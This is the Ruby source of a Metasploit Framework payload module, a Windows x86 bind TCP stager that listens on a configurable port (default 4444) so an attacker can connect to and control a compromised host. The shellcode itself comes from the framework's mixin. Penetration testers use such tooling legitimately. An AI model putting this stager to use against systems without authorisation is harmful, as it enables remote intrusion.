##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/bind_tcp'
require 'msf/core/handler/bind_tcp'


module Metasploit4

  CachedSize = 285

  include Msf::Payload::Windows::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager',
      'Description' => 'Listen for a connection',
      'Author'      => ['hdm', 'skape', 'sf'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => false }
      ))

    # TODO: find out if this is the best way to do it.
    register_options([
      OptPort.new('LPORT', [ true, "The local listener port", 4444 ])
    ], self.class)
  end

  def generate
    generate_bind_tcp
  end

end
